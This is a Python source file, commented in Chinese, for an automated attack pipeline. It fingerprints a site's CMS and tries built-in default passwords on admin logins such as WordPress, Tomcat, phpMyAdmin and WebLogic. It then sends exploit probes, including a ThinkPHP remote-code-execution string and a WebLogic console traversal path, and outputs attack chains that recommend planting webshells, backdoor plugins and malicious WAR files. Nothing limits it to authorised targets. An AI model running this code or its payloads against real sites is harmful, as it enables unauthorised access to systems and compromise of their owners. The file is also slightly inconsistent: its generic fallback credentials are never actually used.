#!/usr/bin/env python3
"""
漏洞检测流水线 - 实现指纹→POC→弱口令→攻击链的联动

支持的流水线阶段：
1. 指纹识别 (tech_detect)
2. 基于指纹的弱口令检测 (fingerprint_weak_password)
3. 漏洞扫描 (vuln_scan)
4. 攻击链生成 (attack_chain)

使用示例：
    from core.pipeline import VulnerabilityPipeline

    pipeline = VulnerabilityPipeline("https://example.com")
    result = pipeline.run_full_pipeline()
"""

from dataclasses import dataclass, field
from typing import Dict, List, Optional, Any, Callable
from enum import Enum
from datetime import datetime
import json
import logging

# 导入统一并发控制管理器
from core.unified_concurrency import get_unified_manager

logger = logging.getLogger(__name__)


class PipelinePhase(Enum):
    """流水线阶段枚举"""
    INIT = "init"
    FINGERPRINT = "fingerprint"
    WEAK_PASSWORD = "weak_password"
    VULN_SCAN = "vuln_scan"
    ATTACK_CHAIN = "attack_chain"
    COMPLETE = "complete"


@dataclass
class PipelineContext:
    """流水线上下文 - 在各阶段之间传递数据"""
    target: str
    start_time: datetime = field(default_factory=datetime.now)

    # 指纹识别结果
    fingerprint: Dict[str, Any] = field(default_factory=dict)
    detected_cms: List[str] = field(default_factory=list)
    detected_frameworks: List[str] = field(default_factory=list)
    server_info: str = ""

    # 弱口令检测结果
    weak_credentials: List[Dict] = field(default_factory=list)
    login_pages: List[str] = field(default_factory=list)

    # 漏洞扫描结果
    vulnerabilities: List[Dict] = field(default_factory=list)

    # 攻击链
    attack_chain: Dict[str, Any] = field(default_factory=dict)

    # 元数据
    current_phase: PipelinePhase = PipelinePhase.INIT
    errors: List[str] = field(default_factory=list)

    def to_dict(self) -> Dict:
        """转换为字典"""
        return {
            "target": self.target,
            "start_time": self.start_time.isoformat(),
            "fingerprint": self.fingerprint,
            "detected_cms": self.detected_cms,
            "detected_frameworks": self.detected_frameworks,
            "server_info": self.server_info,
            "weak_credentials": self.weak_credentials,
            "login_pages": self.login_pages,
            "vulnerabilities": self.vulnerabilities,
            "attack_chain": self.attack_chain,
            "current_phase": self.current_phase.value,
            "errors": self.errors
        }


# CMS/框架专用弱口令字典
# ⚠️ 警告: 这是内置的后备字典，仅包含公开的默认凭据
# 建议: 生产环境应使用外部字典文件或专业密码库
FALLBACK_CREDENTIALS = {
    "_meta": {
        "data_source": "builtin_fallback",
        "description": "内置后备凭据字典，仅包含公开的默认密码",
        "warning": "此字典仅用于检测默认配置，不适合深度弱口令测试",
        "last_updated": "2026-01-15",
    },
    "WordPress": {
        "endpoints": ["/wp-login.php", "/wp-admin/"],
        "credentials": [
            ("admin", "admin"), ("admin", "123456"), ("admin", "password"),
            ("admin", "wordpress"), ("admin", "wp-admin"), ("admin", "admin123")
        ],
        "user_field": "log",
        "pass_field": "pwd",
        "success_indicators": ["dashboard", "wp-admin", "logout"],
        "data_source": "builtin_fallback",
    },
    "Joomla": {
        "endpoints": ["/administrator/", "/administrator/index.php"],
        "credentials": [
            ("admin", "admin"), ("admin", "joomla"), ("admin", "123456")
        ],
        "user_field": "username",
        "pass_field": "passwd",
        "success_indicators": ["control panel", "logout", "administrator"]
    },
    "Drupal": {
        "endpoints": ["/user/login", "/user/"],
        "credentials": [
            ("admin", "admin"), ("admin", "drupal"), ("admin", "123456")
        ],
        "user_field": "name",
        "pass_field": "pass",
        "success_indicators": ["logout", "my account", "dashboard"]
    },
    "Typecho": {
        "endpoints": ["/admin/login.php", "/admin/"],
        "credentials": [
            ("admin", "admin"), ("admin", "typecho"), ("admin", "123456")
        ],
        "user_field": "name",
        "pass_field": "password",
        "success_indicators": ["logout", "write-post", "dashboard"]
    },
    "Discuz": {
        "endpoints": ["/admin.php", "/uc_server/admin.php"],
        "credentials": [
            ("admin", "admin"), ("admin", "discuz"), ("admin", "123456")
        ],
        "user_field": "username",
        "pass_field": "password",
        "success_indicators": ["logout", "administration", "ucenter"]
    },
    "DedeCMS": {
        "endpoints": ["/dede/login.php", "/dede/"],
        "credentials": [
            ("admin", "admin"), ("admin", "dedecms"), ("admin", "123456")
        ],
        "user_field": "userid",
        "pass_field": "pwd",
        "success_indicators": ["logout", "dedemain", "management"]
    },
    "ThinkPHP": {
        "endpoints": ["/admin/login", "/admin/index/login", "/index.php/admin/login"],
        "credentials": [
            ("admin", "admin"), ("admin", "123456"), ("admin", "admin888")
        ],
        "user_field": "username",
        "pass_field": "password",
        "success_indicators": ["logout", "dashboard", "index"]
    },
    "Laravel": {
        "endpoints": ["/admin/login", "/login", "/admin"],
        "credentials": [
            ("admin@admin.com", "admin"), ("admin@admin.com", "password"),
            ("admin", "admin"), ("admin", "secret")
        ],
        "user_field": "email",
        "pass_field": "password",
        "success_indicators": ["logout", "dashboard", "home"]
    },
    "Spring": {
        "endpoints": ["/login", "/admin/login", "/actuator"],
        "credentials": [
            ("admin", "admin"), ("user", "user"), ("spring", "spring")
        ],
        "user_field": "username",
        "pass_field": "password",
        "success_indicators": ["logout", "welcome", "dashboard"]
    },
    "Tomcat": {
        "endpoints": ["/manager/html", "/host-manager/html"],
        "credentials": [
            ("tomcat", "tomcat"), ("admin", "admin"), ("manager", "manager"),
            ("tomcat", "s3cret"), ("admin", "tomcat"), ("both", "tomcat")
        ],
        "user_field": None,  # Basic Auth
        "pass_field": None,
        "auth_type": "basic",
        "success_indicators": ["tomcat web application manager", "server status"]
    },
    "phpMyAdmin": {
        "endpoints": ["/phpmyadmin/", "/pma/", "/phpMyAdmin/"],
        "credentials": [
            ("root", ""), ("root", "root"), ("root", "123456"),
            ("mysql", "mysql"), ("admin", "admin")
        ],
        "user_field": "pma_username",
        "pass_field": "pma_password",
        "success_indicators": ["phpmyadmin", "server:"]
    },
    "Jenkins": {
        "endpoints": ["/login", "/j_spring_security_check"],
        "credentials": [
            ("admin", "admin"), ("jenkins", "jenkins"), ("admin", "password")
        ],
        "user_field": "j_username",
        "pass_field": "j_password",
        "success_indicators": ["logout", "dashboard", "manage jenkins"]
    },
    "GitLab": {
        "endpoints": ["/users/sign_in", "/users/sign_in"],
        "credentials": [
            ("root", "5iveL!fe"), ("admin", "admin"), ("root", "root")
        ],
        "user_field": "user[login]",
        "pass_field": "user[password]",
        "success_indicators": ["logout", "projects", "dashboard"]
    },
    "Weblogic": {
        "endpoints": ["/console/login/LoginForm.jsp", "/console/"],
        "credentials": [
            ("weblogic", "weblogic"), ("weblogic", "weblogic1"),
            ("weblogic", "welcome1"), ("system", "manager")
        ],
        "user_field": "j_username",
        "pass_field": "j_password",
        "success_indicators": ["logout", "domain structure", "weblogic server"]
    },
    "Nginx": {
        "endpoints": ["/nginx-status", "/status"],
        "credentials": [],  # 通常无登录
        "check_only": True,  # 只检查是否暴露
        "success_indicators": ["active connections", "server accepts"]
    },
    "Apache": {
        "endpoints": ["/server-status", "/server-info"],
        "credentials": [],
        "check_only": True,
        "success_indicators": ["apache server status", "server version"]
    }
}

# 通用弱口令（当无法识别CMS时使用）
GENERIC_CREDENTIALS = [
    ("admin", "admin"), ("admin", "123456"), ("admin", "password"),
    ("admin", "admin123"), ("root", "root"), ("test", "test"),
    ("guest", "guest"), ("user", "user"), ("administrator", "administrator")
]


class VulnerabilityPipeline:
    """漏洞检测流水线 - 集成性能监控和智能缓存"""

    def __init__(self, target: str, verify_ssl: bool = True, timeout: int = 10, use_unified_manager: bool = True):
        """初始化流水线

        Args:
            target: 目标URL
            verify_ssl: 是否验证SSL证书
            timeout: 请求超时时间
            use_unified_manager: 是否使用统一管理器 (性能监控+缓存)
        """
        self.target = target
        self.verify_ssl = verify_ssl
        self.timeout = timeout
        self.context = PipelineContext(target=target)

        # 统一管理器 (性能监控 + 缓存 + 限流)
        self.manager = get_unified_manager() if use_unified_manager else None
        if self.manager and not self.manager._initialized:
            self.manager.start()

        # 尝试导入requests
        try:
            import requests
            self._requests = requests
        except ImportError:
            self._requests = None

    def run_full_pipeline(self) -> Dict[str, Any]:
        """运行完整流水线

        Returns:
            流水线执行结果
        """
        results = {
            "target": self.target,
            "phases": {},
            "summary": {}
        }

        # Phase 1: 指纹识别
        self.context.current_phase = PipelinePhase.FINGERPRINT
        fingerprint_result = self._run_fingerprint()
        results["phases"]["fingerprint"] = fingerprint_result

        # Phase 2: 基于指纹的弱口令检测
        self.context.current_phase = PipelinePhase.WEAK_PASSWORD
        weak_pass_result = self._run_fingerprint_weak_password()
        results["phases"]["weak_password"] = weak_pass_result

        # Phase 3: 漏洞扫描（利用指纹信息）
        self.context.current_phase = PipelinePhase.VULN_SCAN
        vuln_result = self._run_targeted_vuln_scan()
        results["phases"]["vuln_scan"] = vuln_result

        # Phase 4: 生成攻击链
        self.context.current_phase = PipelinePhase.ATTACK_CHAIN
        chain_result = self._generate_attack_chain()
        results["phases"]["attack_chain"] = chain_result

        # 生成摘要
        self.context.current_phase = PipelinePhase.COMPLETE
        results["summary"] = self._generate_summary()
        results["context"] = self.context.to_dict()

        return results

    def _run_fingerprint(self) -> Dict[str, Any]:
        """运行指纹识别 - 集成缓存和性能监控"""
        if not self._requests:
            return {"success": False, "error": "requests库未安装"}

        # 检查缓存
        if self.manager:
            cached = self.manager.get_tech(self.target)
            if cached:
                logger.info(f"指纹识别命中缓存: {self.target}")
                self.context.fingerprint = cached
                self.context.detected_cms = cached.get("cms", [])
                self.context.detected_frameworks = cached.get("frameworks", [])
                self.context.server_info = cached.get("server", "Unknown")
                return {
                    "success": True,
                    "technology": cached,
                    "detected_count": len(cached.get("cms", [])) + len(cached.get("frameworks", [])),
                    "from_cache": True
                }

        # 性能监控埋点
        exec_id = None
        if self.manager:
            exec_id = self.manager.monitor.start_execution("fingerprint_detect")

        try:
            resp = self._requests.get(
                self.target,
                timeout=self.timeout,
                verify=self.verify_ssl
            )
            headers = resp.headers
            html = resp.text.lower()

            tech = {
                "server": headers.get("Server", "Unknown"),
                "powered_by": headers.get("X-Powered-By", ""),
                "cms": [],
                "frameworks": []
            }

            # CMS检测
            cms_patterns = {
                "WordPress": ["wp-content", "wordpress", "wp-json"],
                "Joomla": ["joomla", "com_content"],
                "Drupal": ["drupal", "sites/default"],
                "Typecho": ["typecho", "usr/themes"],
                "Discuz": ["discuz", "discuzcode"],
                "DedeCMS": ["dedecms", "dede/"],
                "ThinkPHP": ["thinkphp", "think_template"],
                "Magento": ["magento", "mage/"],
                "Shopify": ["shopify", "cdn.shopify.com"]
            }

            for cms, patterns in cms_patterns.items():
                if any(p in html for p in patterns):
                    tech["cms"].append(cms)

            # 框架检测
            framework_patterns = {
                "Laravel": ["laravel", "laravel_session"],
                "Django": ["django", "csrfmiddlewaretoken"],
                "Spring": ["spring", "j_spring_security"],
                "Express.js": ["express"],
                "ASP.NET": [".aspx", "asp.net", "__viewstate"],
                "Ruby on Rails": ["rails", "_rails"],
                "Vue.js": ["vue", "__vue__"],
                "React": ["react", "reactdom"],
                "Angular": ["angular", "ng-"]
            }

            for fw, patterns in framework_patterns.items():
                if any(p in html or p in str(headers).lower() for p in patterns):
                    tech["frameworks"].append(fw)

            # 服务器检测
            server = tech["server"].lower()
            if "tomcat" in server:
                tech["cms"].append("Tomcat")
            if "nginx" in server:
                tech["frameworks"].append("Nginx")
            if "apache" in server:
                tech["frameworks"].append("Apache")
            if "weblogic" in server:
                tech["cms"].append("Weblogic")

            # 更新上下文
            self.context.fingerprint = tech
            self.context.detected_cms = tech["cms"]
            self.context.detected_frameworks = tech["frameworks"]
            self.context.server_info = tech["server"]

            # 写入缓存
            if self.manager:
                self.manager.cache_tech(self.target, tech)
                self.manager.monitor.end_execution(exec_id, success=True, result_size=len(str(tech)))

            return {
                "success": True,
                "technology": tech,
                "detected_count": len(tech["cms"]) + len(tech["frameworks"])
            }

        except Exception as e:
            self.context.errors.append(f"指纹识别失败: {str(e)}")
            if self.manager and exec_id:
                self.manager.monitor.end_execution(exec_id, success=False, error=str(e))
            return {"success": False, "error": str(e)}

    def _run_fingerprint_weak_password(self) -> Dict[str, Any]:
        """基于指纹的弱口令检测 - 集成性能监控"""
        if not self._requests:
            return {"success": False, "error": "requests库未安装"}

        # 性能监控埋点
        exec_id = None
        if self.manager:
            exec_id = self.manager.monitor.start_execution("weak_password_detect")

        results = {
            "success": True,
            "tested_cms": [],
            "weak_credentials": [],
            "exposed_panels": []
        }

        base_url = self.target.rstrip('/')

        # 根据检测到的CMS/框架选择专用字典
        targets = set(self.context.detected_cms + self.context.detected_frameworks)

        # 如果没有检测到特定CMS，使用通用检测
        if not targets:
            targets = {"Generic"}

        for cms in targets:
            if cms in CMS_DEFAULT_CREDENTIALS:
                cms_config = CMS_DEFAULT_CREDENTIALS[cms]
                results["tested_cms"].append(cms)

                for endpoint in cms_config.get("endpoints", []):
                    test_url = f"{base_url}{endpoint}"

                    # 只检查是否暴露
                    if cms_config.get("check_only"):
                        try:
                            resp = self._requests.get(
                                test_url,
                                timeout=self.timeout,
                                verify=self.verify_ssl
                            )
                            if resp.status_code == 200:
                                for indicator in cms_config.get("success_indicators", []):
                                    if indicator in resp.text.lower():
                                        results["exposed_panels"].append({
                                            "cms": cms,
                                            "url": test_url,
                                            "type": "Information Exposure"
                                        })
                                        break
                        except Exception as exc:
                            logging.getLogger(__name__).warning("Suppressed exception", exc_info=True)

                        continue

                    # Basic Auth
                    if cms_config.get("auth_type") == "basic":
                        for user, pwd in cms_config.get("credentials", []):
                            try:
                                resp = self._requests.get(
                                    test_url,
                                    auth=(user, pwd),
                                    timeout=self.timeout,
                                    verify=self.verify_ssl
                                )
                                if resp.status_code == 200:
                                    for indicator in cms_config.get("success_indicators", []):
                                        if indicator in resp.text.lower():
                                            cred = {
                                                "cms": cms,
                                                "url": test_url,
                                                "username": user,
                                                "password": pwd,
                                                "auth_type": "basic"
                                            }
                                            results["weak_credentials"].append(cred)
                                            self.context.weak_credentials.append(cred)
                                            break
                            except Exception as exc:
                                logging.getLogger(__name__).warning("Suppressed exception", exc_info=True)

                    else:
                        # Form-based Auth
                        user_field = cms_config.get("user_field", "username")
                        pass_field = cms_config.get("pass_field", "password")

                        for user, pwd in cms_config.get("credentials", []):
                            try:
                                data = {user_field: user, pass_field: pwd}
                                resp = self._requests.post(
                                    test_url,
                                    data=data,
                                    timeout=self.timeout,
                                    verify=self.verify_ssl,
                                    allow_redirects=True
                                )

                                response_text = resp.text.lower()
                                # 检查登录成功标志
                                for indicator in cms_config.get("success_indicators", []):
                                    if indicator in response_text:
                                        cred = {
                                            "cms": cms,
                                            "url": test_url,
                                            "username": user,
                                            "password": pwd,
                                            "auth_type": "form"
                                        }
                                        results["weak_credentials"].append(cred)
                                        self.context.weak_credentials.append(cred)
                                        break
                            except Exception as exc:
                                logging.getLogger(__name__).warning("Suppressed exception", exc_info=True)

        # 记录登录页面
        self.context.login_pages = [c["url"] for c in results["weak_credentials"]]

        # 结束性能监控
        if self.manager and exec_id:
            self.manager.monitor.end_execution(exec_id, success=True, result_size=len(results["weak_credentials"]))

        return results

    def _run_targeted_vuln_scan(self) -> Dict[str, Any]:
        """基于指纹的针对性漏洞扫描 - 集成性能监控"""
        # 性能监控埋点
        exec_id = None
        if self.manager:
            exec_id = self.manager.monitor.start_execution("targeted_vuln_scan")

        results = {
            "success": True,
            "vulnerabilities": [],
            "targeted_checks": []
        }

        # 根据CMS选择针对性检测
        cms_vulns = {
            "WordPress": [
                {"check": "xmlrpc", "path": "/xmlrpc.php", "method": "POST", "data": "<methodCall><methodName>system.listMethods</methodName></methodCall>"},
                {"check": "user_enum", "path": "/wp-json/wp/v2/users", "method": "GET"},
            ],
            "ThinkPHP": [
                {"check": "rce_5x", "path": "/?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1", "method": "GET"},
            ],
            "Spring": [
                {"check": "actuator", "path": "/actuator/env", "method": "GET"},
                {"check": "heapdump", "path": "/actuator/heapdump", "method": "HEAD"},
            ],
            "Laravel": [
                {"check": "debug", "path": "/_ignition/health-check", "method": "GET"},
                {"check": "env", "path": "/.env", "method": "GET"},
            ],
            "Tomcat": [
                {"check": "manager", "path": "/manager/status", "method": "GET"},
            ],
            "Weblogic": [
                {"check": "console", "path": "/console/css/%252e%252e%252fconsolejndi.portal", "method": "GET"},
            ]
        }

        base_url = self.target.rstrip('/')

        for cms in self.context.detected_cms:
            if cms in cms_vulns:
                results["targeted_checks"].append(cms)

                for vuln_check in cms_vulns[cms]:
                    try:
                        test_url = f"{base_url}{vuln_check['path']}"

                        if vuln_check["method"] == "GET":
                            resp = self._requests.get(
                                test_url,
                                timeout=self.timeout,
                                verify=self.verify_ssl
                            )
                        elif vuln_check["method"] == "HEAD":
                            resp = self._requests.head(
                                test_url,
                                timeout=self.timeout,
                                verify=self.verify_ssl
                            )
                        elif vuln_check["method"] == "POST":
                            resp = self._requests.post(
                                test_url,
                                data=vuln_check.get("data", ""),
                                timeout=self.timeout,
                                verify=self.verify_ssl
                            )
                        else:
                            continue

                        # 分析响应
                        if resp.status_code == 200:
                            vuln = {
                                "cms": cms,
                                "check": vuln_check["check"],
                                "url": test_url,
                                "status_code": resp.status_code,
                                "severity": "HIGH"
                            }
                            results["vulnerabilities"].append(vuln)
                            self.context.vulnerabilities.append(vuln)

                    except Exception as exc:
                        logging.getLogger(__name__).warning("Suppressed exception", exc_info=True)

        # 结束性能监控
        if self.manager and exec_id:
            self.manager.monitor.end_execution(exec_id, success=True, result_size=len(results["vulnerabilities"]))

        return results

    def _generate_attack_chain(self) -> Dict[str, Any]:
        """生成攻击链"""
        chain = {
            "phases": [],
            "recommended_sequence": [],
            "exploitation_paths": []
        }

        # 基于指纹的初始访问
        if self.context.detected_cms:
            chain["phases"].append({
                "phase": "Initial Access",
                "technique": "CMS Exploitation",
                "targets": self.context.detected_cms,
                "next_steps": ["Check for known CVEs", "Test default credentials"]
            })

        # 基于弱口令的访问
        if self.context.weak_credentials:
            chain["phases"].append({
                "phase": "Initial Access",
                "technique": "Valid Accounts",
                "credentials_found": len(self.context.weak_credentials),
                "next_steps": ["Access admin panel", "Upload webshell", "Modify configurations"]
            })

            # 生成利用路径
            for cred in self.context.weak_credentials:
                path = {
                    "step": 1,
                    "action": f"Login to {cred['cms']} using {cred['username']}:{cred['password']}",
                    "url": cred["url"],
                    "next": []
                }

                # 根据CMS添加后续步骤
                if cred["cms"] == "WordPress":
                    path["next"] = [
                        "Upload malicious plugin",
                        "Edit theme PHP files",
                        "Install backdoor plugin"
                    ]
                elif cred["cms"] == "Tomcat":
                    path["next"] = [
                        "Deploy malicious WAR file",
                        "Execute commands via manager"
                    ]
                elif cred["cms"] in ["ThinkPHP", "Laravel", "Django"]:
                    path["next"] = [
                        "Modify application code",
                        "Access database credentials",
                        "Create admin account"
                    ]

                chain["exploitation_paths"].append(path)

        # 基于漏洞的利用
        if self.context.vulnerabilities:
            chain["phases"].append({
                "phase": "Exploitation",
                "technique": "Exploit Public-Facing Application",
                "vulns_found": len(self.context.vulnerabilities),
                "next_steps": ["Verify exploitability", "Develop PoC", "Execute exploit"]
            })

        # 生成推荐序列
        priority_order = [
            ("weak_credentials", "利用弱口令获取管理员访问"),
            ("vulnerabilities", "利用已知漏洞"),
            ("exposed_panels", "探索暴露的管理面板")
        ]

        step = 1
        for attr, desc in priority_order:
            items = getattr(self.context, attr, [])
            if items:
                chain["recommended_sequence"].append({
                    "step": step,
                    "action": desc,
                    "count": len(items),
                    "priority": "HIGH" if step == 1 else "MEDIUM"
                })
                step += 1

        self.context.attack_chain = chain
        return {"success": True, "attack_chain": chain}

    def _generate_summary(self) -> Dict[str, Any]:
        """生成流水线执行摘要 - 包含性能统计"""
        summary = {
            "target": self.target,
            "fingerprint_count": len(self.context.detected_cms) + len(self.context.detected_frameworks),
            "detected_cms": self.context.detected_cms,
            "detected_frameworks": self.context.detected_frameworks,
            "weak_credentials_found": len(self.context.weak_credentials),
            "vulnerabilities_found": len(self.context.vulnerabilities),
            "attack_paths_generated": len(self.context.attack_chain.get("exploitation_paths", [])),
            "errors": self.context.errors,
            "risk_level": self._calculate_risk_level()
        }

        # 添加性能统计
        if self.manager:
            summary["performance"] = {
                "cache_stats": self.manager.get_cache_stats(),
                "monitor_stats": self.manager.get_monitor_stats(),
            }

        return summary

    def _calculate_risk_level(self) -> str:
        """计算风险等级"""
        score = 0

        # 弱口令权重最高
        score += len(self.context.weak_credentials) * 30

        # 漏洞
        score += len(self.context.vulnerabilities) * 20

        # CMS识别（可能有已知漏洞）
        score += len(self.context.detected_cms) * 5

        if score >= 50:
            return "CRITICAL"
        elif score >= 30:
            return "HIGH"
        elif score >= 10:
            return "MEDIUM"
        else:
            return "LOW"


def fingerprint_weak_password_detect(
    url: str,
    cms_hint: Optional[str] = None,
    verify_ssl: bool = True,
    timeout: int = 10
) -> Dict[str, Any]:
    """基于指纹的弱口令检测（独立函数）

    Args:
        url: 目标URL
        cms_hint: CMS提示（来自tech_detect结果）
        verify_ssl: 是否验证SSL
        timeout: 超时时间

    Returns:
        检测结果
    """
    pipeline = VulnerabilityPipeline(url, verify_ssl, timeout)

    # 如果提供了CMS提示，直接使用
    if cms_hint:
        pipeline.context.detected_cms = [cms_hint] if isinstance(cms_hint, str) else list(cms_hint)
    else:
        # 否则先运行指纹识别
        pipeline._run_fingerprint()

    # 运行弱口令检测
    result = pipeline._run_fingerprint_weak_password()
    result["fingerprint"] = {
        "cms": pipeline.context.detected_cms,
        "frameworks": pipeline.context.detected_frameworks
    }

    return result


def run_pipeline(target: str, **kwargs) -> Dict[str, Any]:
    """运行完整流水线（便捷函数）"""
    pipeline = VulnerabilityPipeline(target, **kwargs)
    return pipeline.run_full_pipeline()


# 向后兼容别名 (已废弃，请使用 FALLBACK_CREDENTIALS)
CMS_DEFAULT_CREDENTIALS = FALLBACK_CREDENTIALS

# 导出
__all__ = [
    'VulnerabilityPipeline',
    'PipelineContext',
    'PipelinePhase',
    'FALLBACK_CREDENTIALS',
    'CMS_DEFAULT_CREDENTIALS',  # 向后兼容，已废弃
    'fingerprint_weak_password_detect',
    'run_pipeline'
]
